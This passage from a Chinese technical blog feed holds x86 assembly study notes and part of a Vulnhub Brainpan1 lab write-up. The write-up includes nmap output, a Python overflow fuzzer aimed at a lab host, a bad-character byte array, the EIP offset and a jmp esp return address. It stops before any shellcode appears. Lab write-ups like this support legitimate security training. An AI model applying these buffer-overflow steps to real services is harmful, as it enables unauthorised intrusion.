</p><p>关注点：</p><ul><li>看谁和谁作比较</li><li>比较结果会影响标志寄存器（ZF）</li><li>标志寄存器（ZF）会影响je跳转的方向</li></ul><h4 id="test指令"><a href="#test指令" class="headerlink" title="test指令"></a>test指令</h4><p>test：执行“按位与”运算，不存结果，仅设置标志位TEST AX,BX与AND AX,BX命令有相同效果，只是Test指令不改变AX和BX的内容，而AND指令会把结果保存到AX中。</p><p>常见用途：</p><ul><li>检查特定的标志位：如需检查某个标志位是否为1，可以用test实现</li><li>检查寄存器中某些特定位是否被置1，例如test eax，0x01可以检查eax的最低为是否为1</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34357387/1738426281502-6688ab99-afd2-485e-856d-5f672e971473.png?x-oss-process=image/format,webp"></p><h3 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h3><p>作用：改变程序的执行流程</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/29.png"></p><p>ja如果大于则跳转      ja label</p><p>jb    如果小于则跳转      jb label</p><p><code>je/jz</code>        <font style="color:rgb(77, 77, 77);">Jump if Equal&#x2F;</font>Jump if Zero</p><p><code>jne/jnz</code>    Jump if Not Equal&#x2F;Jump if Not Zero</p><p><code>call</code> </p><p>本质：1.push返回地址（call执行完的下一行代码地址）；2.进入到call内部执行（相当于jmp到子函数的位置）；3.执行完子程序，ret到1的返回地址</p><p>F7可以步入到call子程序里面</p><h3 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h3><p> 作用：用于栈管理</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/30.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/31.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/32.png"></p><h3 id="字符串操作指令"><a href="#字符串操作指令" class="headerlink" title="字符串操作指令"></a>字符串操作指令</h3><p><code>mov指令</code>：字符串赋值</p><p><code>rep movsb指令</code>：批量复制字符串数据</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/33.png"></p><p><code>cmp指令</code>：检测字符串是否匹配；用于实现strcmp、strncmp等</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/34.png"></p><p><code>scas指令</code>： </p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/35.png"></p><p> <code>stos指令</code>：</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/36.png"></p><p><code>loads指令</code>：</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/37.png"> </p><p><code>堆栈中的字符串操作</code>：</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/38.png"></p><h3 id="浮点运算指令"><a href="#浮点运算指令" class="headerlink" title="浮点运算指令"></a>浮点运算指令</h3><h4 id="FPU（Floating-Point-Unit，浮点运算单元）"><a href="#FPU（Floating-Point-Unit，浮点运算单元）" class="headerlink" title="FPU（Floating Point Unit，浮点运算单元）"></a>FPU（Floating Point Unit，浮点运算单元）</h4><ul><li>定义：FPU是处理器中的一个硬件模块，专门负责浮点运算。</li><li>功能：处理浮点数的加减乘除、平方根、三角函数等复杂操作。</li><li>实现：</li></ul><p>在早期X86处理器中，FPU是一个独立的协处理器（如Intel 8087）</p><p>从80486开始，FPU集成进了cpu模块</p><p>FPU的组成：</p><ol><li>寄存器堆栈：<ol><li><font style="background-color:#F3BB2F;">8个80位宽的浮点寄存器（ST0-ST7），以堆栈形式组织。</font></li><li>通过push和pop模式操作寄存器</li></ol></li><li>状态寄存器：用于保存堆栈状态（如堆栈深度）和计算标志（如c0-c3）</li><li>控制寄存器：配置FPU的工作模式（如精度、舍入模式等）</li></ol><h4 id="X87指令集"><a href="#X87指令集" class="headerlink" title="X87指令集"></a>X87指令集</h4><ul><li>定义：X87是专门为FPU设计的一套指令集，早期专用于处理浮点运算</li><li>特点：<ul><li><font style="background-color:#F3BB2F;">操作对象是FPU的堆栈寄存器（ST0-ST7）</font></li><li><font style="background-color:#F3BB2F;">指令风格通常是Fxxx开头</font>，比如FLD（加载浮点数）、FADD（浮点数加法）</li><li>支持扩展精度（80位），比SSE的单精度和双精度浮点数更高</li></ul></li><li><font style="background-color:#F3BB2F;">代表指令：</font><ul><li>FLD&#x2F;FST：加载&#x2F;存储浮点数</li><li>FADD&#x2F;FSUB：浮点数加法&#x2F;减法</li><li>FMUL&#x2F;FDIV：浮点数乘法&#x2F;除法</li><li>FCOM&#x2F;FUCOM：比较浮点数</li></ul></li><li>X87适用场景<ul><li>高精度计算（科学计算）</li><li>需要80位扩展精度支持的场景</li></ul></li></ul><h4 id="SSE（Streaming-SIMD-Extensions）"><a href="#SSE（Streaming-SIMD-Extensions）" class="headerlink" title="SSE（Streaming SIMD Extensions）"></a>SSE（Streaming SIMD Extensions）</h4><ul><li>定义：SSE是intel在x86处理器上引入的一套SIMD（单指令多数据）扩展指令集</li><li>特点：<ul><li><font style="background-color:#F3BB2F;">采用xmm寄存器（每个128位宽）</font></li><li>支持并行处理多个<font style="background-color:#F3BB2F;">单</font>精度（32位）或<font style="background-color:#F3BB2F;">双</font>精度（64位）浮点数</li><li><font style="background-color:#F3BB2F;">指令风格是xxxPS（处理单精度矢量）或xxxSD(处理双精度矢量）</font></li></ul></li><li>优势：<ul><li>更快的浮点计算（无需堆栈操作）</li><li>并行处理多个浮点数（提高性能）</li></ul></li><li>SSE使用场景：<ul><li>并行计算（如多媒体、游戏、音视频处理）</li><li>性能要求较高但不需要扩展精度的场景</li></ul></li></ul><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/39.png"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数的地位"><a href="#函数的地位" class="headerlink" title="函数的地位"></a>函数的地位</h4><p>函数是代码逻辑的最小单元，他的功能是封装可复用的代码</p><h4 id="函数必备"><a href="#函数必备" class="headerlink" title="函数必备"></a>函数必备</h4><p>参数、返回值</p><h4 id="函数的汇编代码的样子"><a href="#函数的汇编代码的样子" class="headerlink" title="函数的汇编代码的样子"></a>函数的汇编代码的样子</h4><p><strong>外层看：一个地址标识的入口</strong></p><p>call xxx相当于入口，其中xxx是要<font style="background-color:#F3BB2F;">跳转过去</font>执行的<font style="background-color:#F3BB2F;">代码地址</font></p><p>系统函数基本上都是有名字的，工具可能会标注</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/40.png"></p><p><strong>内层看：一堆等待执行的代码集合</strong></p><h4 id="分析call的常用方法"><a href="#分析call的常用方法" class="headerlink" title="分析call的常用方法"></a>分析call的常用方法</h4><p>中断状态</p><p>F7：单步执行进入到call中</p><p>F8：步过这个call</p><p>非中断状态</p><p>回车键：进入到call查看代码</p><p>减号键出来</p><p>利用dbg分析call函数的范围（仅供参考）</p><h4 id="真实的软件开发例子来理解函数"><a href="#真实的软件开发例子来理解函数" class="headerlink" title="真实的软件开发例子来理解函数"></a>真实的软件开发例子来理解函数</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/41.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/42.png"></p><h3 id="函数与栈结构"><a href="#函数与栈结构" class="headerlink" title="函数与栈结构"></a>函数与栈结构</h3><h4 id="明确两点："><a href="#明确两点：" class="headerlink" title="明确两点："></a>明确两点：</h4><p>1.程序的基本单位是函数</p><p>2.函数的结构全部都是栈结构（esp顶，ebp底）</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/43.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/44.png"></p><p>sub esp,0x10    为局部变量分配空间</p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/45.png"></p><p><strong>嵌套调用</strong></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/46.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/47.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/48.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/49.png"></p><h3 id="函数嵌套"><a href="#函数嵌套" class="headerlink" title="函数嵌套"></a>函数嵌套</h3><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/50.png"></p><h4 id="函数嵌套堆栈图"><a href="#函数嵌套堆栈图" class="headerlink" title="函数嵌套堆栈图"></a>函数嵌套堆栈图</h4><p> <img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/51.png"></p><h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><p> <img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/52.png"></p><h4 id="c调用约定"><a href="#c调用约定" class="headerlink" title="c调用约定"></a>c调用约定</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/53.png"></p><p><font style="background-color:#F3BB2F;">！！！ c调用约定的特征</font>：push push push  &#x2F;  call  &#x2F;  add esp，xxx</p><p>由于push的时候，esp是不断减小的，所以恢复栈地址的时候，需要反其道而行之，需要<code>add esp，xxx</code>(xxx&#x2F;4的结果为push的参数的个数)（外平栈） </p><h4 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/54.png"> </p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/55.png"></p><p><font style="background-color:#F3BB2F;">！！！stdcall的特征：</font>push push push  &#x2F; call xxx &#x2F; 无需清理栈</p><p>内平栈：在retn 0xc平栈，无需在call下平栈</p><h4 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/56.png"></p><p><font style="background-color:#F3BB2F;">！！！fastcall的特征</font>：ecx、edx同时用到了 &#x2F; push &#x2F;  call xxx &#x2F; 无需平栈</p><p>前两个参数通过寄存器传递，其余参数通过栈传递。</p><h4 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/57.png"></p><p><font style="background-color:#F3BB2F;">！！！thiscall特征：</font>仅用到了ecx寄存器 &#x2F; push &#x2F; push &#x2F; call xxx &#x2F; add esp , xxx</p><p> thiscall可外平栈可内平栈</p><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/58.png"></p><h3 id="段"><a href="#段" class="headerlink" title="段"></a>段</h3><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/59.png"></p><p><img src="/../img/%E6%B1%87%E7%BC%96Basic%EF%BC%81.md/60.png"></p>]]></content>
    
    
    <categories>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编指令</tag>
      
      <tag>栈</tag>
      
      <tag>函数</tag>
      
      <tag>函数调用约定</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-brainpan1</title>
    <link href="/2025/06/02/vulnhub-Brainpan1/"/>
    <url>/2025/06/02/vulnhub-Brainpan1/</url>
    
    <content type="html"><![CDATA[<p><em><strong>tips：</strong></em></p><p><em><strong>缓冲区溢出（构造 eip 指向 esp、  esp 构造 shellcode）</strong></em></p><p><em><strong>vlum-nmap漏洞探测</strong></em></p><p><em><strong>wfuzz目录爆破</strong></em></p><p><em><strong>msf-pattern</strong></em></p><p><em><strong>badchars坏字节</strong></em></p><p><em><strong>Immunity Debugger -&gt;mona.py</strong></em></p><p><em><strong>Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权）</strong></em></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>锁定靶机 ip</p><p><img src="/../img/vulnhub-Brainpan1.md/1.png"></p><h4 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h4><p><img src="/../img/vulnhub-Brainpan1.md/2.png"></p><p>发现两个端口  9999 10000</p><h5 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h5><p><img src="/../img/vulnhub-Brainpan1.md/3.png"></p><h5 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a>TCP 扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p9999,10000 192.168.17.144<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 13:54 EDT<br>Nmap scan report for 192.168.17.144<br>Host is up (0.00083s latency).<br><br>PORT      STATE SERVICE VERSION<br>9999/tcp  open  abyss?<br>| fingerprint-strings: <br>|   NULL: <br>|     _| _| <br>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| <br>|     _|_| _| _| _| _| _| _| _| _| _| _| _|<br>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|<br>|     [________________________ WELCOME TO BRAINPAN _________________________]<br>|_    ENTER THE PASSWORD<br>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9999-TCP:V=7.95%I=7%D=6/1%Time=683C93E0%P=x86_64-pc-linux-gnu%r(NUL<br>SF:L,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\<br>SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x<br>SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2<br>SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\<br>SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2<br>SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\<br>SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2<br>SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x<br>SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2<br>SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2<br>SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x<br>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&quot;);<br>MAC Address: 00:0C:29:86:CE:1D (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.10<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.15 seconds<br><br></code></pre></td></tr></table></figure><h5 id="vlum-扫描"><a href="#vlum-扫描" class="headerlink" title="vlum 扫描"></a>vlum 扫描</h5><p>Nmap 的漏洞扫描将针对目标运行该工具的默认漏洞扫描脚本。这些对于查找可利用的常见漏洞非常有用。</p><p><img src="/../img/vulnhub-Brainpan1.md/4.png"></p><h3 id="10000-端口"><a href="#10000-端口" class="headerlink" title="10000 端口"></a>10000 端口</h3><p>浏览器访问：192.168.17.144：10000</p><p><img src="/../img/vulnhub-Brainpan1.md/5.png"></p><h4 id="目录爆破："><a href="#目录爆破：" class="headerlink" title="目录爆破："></a>目录爆破：</h4><p>wfuzz 工具</p><p><img src="/../img/vulnhub-Brainpan1.md/6.png"></p><p>进入 bin 目录下</p><p><img src="/../img/vulnhub-Brainpan1.md/7.png"></p><p>下载到本地</p><p><img src="/../img/vulnhub-Brainpan1.md/8.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/9.png"></p><h3 id="9999-端口"><a href="#9999-端口" class="headerlink" title="9999 端口"></a>9999 端口</h3><p><img src="/../img/vulnhub-Brainpan1.md/10.png"></p><p>nc 尝试：</p><p><img src="/../img/vulnhub-Brainpan1.md/11.png"></p><p>有可以输入的地方，但是还不知道如何利用</p><h3 id="brainpan-exe"><a href="#brainpan-exe" class="headerlink" title="brainpan.exe"></a>brainpan.exe</h3><p>win10 虚拟机运行后，kali 连接</p><p><img src="/../img/vulnhub-Brainpan1.md/12.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/13.png"></p><p><strong>根据这个提示，copied * to buffer，猜测，是否有缓冲区溢出漏洞？</strong></p><p><strong><font style="color:rgb(51, 51, 51);">确定溢出大小 -&gt; 控制 eip</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 寻找 jmp esp -&gt; 测试坏字符</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 生成shellcode -&gt; 添加适量的nop</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 开始攻击</font></strong></p><p>139 个字符都不溢出</p><p><img src="/../img/vulnhub-Brainpan1.md/14.png"></p><h4 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h4><p>写一个自动测试溢出的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>size = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Send evil buffer %s bytes&quot;</span> % size <br>        buffer = <span class="hljs-string">&#x27;A&#x27;</span> * size<br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        s.connect((<span class="hljs-string">&quot;192.168.17.144&quot;</span>,<span class="hljs-number">9999</span>))<br>        s.send(buffer)<br>        s.close()<br><br>        size += <span class="hljs-number">100</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] Could not connect.&quot;</span>)<br>        sys.exit()<br><br><br><br><br></code></pre></td></tr></table></figure><p>成功运行脚本，最多能发 700 字节</p><p><img src="/../img/vulnhub-Brainpan1.md/15.png"></p><h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><img src="/../img/vulnhub-Brainpan1.md/17.png"></p><p>注意 <strong>EIP</strong> 的地址：35724134（EIP 始终指向当前正在执行的指令之后的那条指令的内存地址。CPU 根据 EIP 的值从内存中读取指令并执行，执行完毕后 EIP 会自动递增（或根据跳转指令修改）以指向下一条指令。）</p><p><img src="/../img/vulnhub-Brainpan1.md/18.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/19.png"></p><p>精确的匹配在 524 这个位置上（A 储存在 EDX 寄存器中）</p><p>重新构造 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/20.png"></p><p>发送 exp，查看寄存器信息</p><p><img src="/../img/vulnhub-Brainpan1.md/21.png"></p><p>说明找到的 eip 是正确的（利用的话，在 eip 之后就可以存放 shellcode，把我们的反弹信息放i进去）</p><p>目前 C 仅有 72 字节，正常 payload 的大小为** 350-400 字节**</p><p>那么如何利用呢？</p><h4 id="扩容-esp"><a href="#扩容-esp" class="headerlink" title="扩容 esp"></a>扩容 esp</h4><p>修改 exp 中 C 的大小为 500，发送 exp</p><p>接受之后，在栈中查看 esp 的大小（0x005FFAE4-0x005FF910 &#x3D; 0x1D4）468 个字节</p><p><img src="/../img/vulnhub-Brainpan1.md/22.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/23.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/24.png"></p><p>468 字节！</p><p>大小合适！</p><p>说明 esp 的空间可以为我所用！</p><h5 id="验证-esp-中有哪些坏字符"><a href="#验证-esp-中有哪些坏字符" class="headerlink" title="验证 esp 中有哪些坏字符"></a>验证 esp 中有哪些坏字符</h5><p>（c 语言程序中 0x00 默认就是坏字节）</p><p>GitHub：badchars</p><p><img src="/../img/vulnhub-Brainpan1.md/25.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1/badchars]<br>└─$ ./badchars -f ruby<br>badchars = (<br>  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; +<br>  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; +<br>  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; +<br>  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; +<br>  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; +<br>  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; +<br>  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; +<br>  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; +<br>  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; +<br>  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; +<br>  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; +<br>  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; +<br>  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; +<br>  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; +<br>  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; +<br>  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;<br>)<br><br><br><br></code></pre></td></tr></table></figure><p>修改 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/26.png"></p><p>发送 exp，查看 esp 内存中的值</p><p><img src="/../img/vulnhub-Brainpan1.md/27.png"></p><p>可以看到 01-FF 都在内存中连续，正确的展示出来了，说明该程序中<strong>没有坏字节</strong></p><p>若内存中本该出现 01-FF 的内存中出现了 00 或者间断的字节内容，就说明存在坏字节</p><h4 id="构造-EIP-指向-ESP"><a href="#构造-EIP-指向-ESP" class="headerlink" title="构造 EIP 指向 ESP"></a>构造 EIP 指向 ESP</h4><p>每次 esp 的地址是不固定的，那么我们需要使用 EIP 来指向一个 esp 的地址</p><p>拿到 jmp esp 的操作码</p><p><img src="/../img/vulnhub-Brainpan1.md/28.png"></p><h5 id="Immunity-Debugger-mona-py"><a href="#Immunity-Debugger-mona-py" class="headerlink" title="Immunity Debugger -&gt;mona.py"></a><font style="color:rgb(51, 51, 51);">Immunity Debugger -&gt;</font>mona.py</h5><p>无 rebase 无 safeSEH 无 ASLR 无 CFG 无 NX 无 OS Dll</p><p><img src="/../img/vulnhub-Brainpan1.md/29.png"></p><p>通过字节码在 exe 找 jmp esp 的地址</p><p><img src="/../img/vulnhub-Brainpan1.md/30.png"></p><p>地址：0x311712f3       “\xff\xe4”（jmp 的字节码）</p><h6 id="构造-EIP-的内容："><a href="#构造-EIP-的内容：" class="headerlink" title="构造 EIP 的内容："></a>构造 EIP 的内容：</h6><p>在 exp 中的 EIP 位置，构造0x311712f3 地址，小端序–&gt;”\xf3\x12\x17\x31”</p><p><img 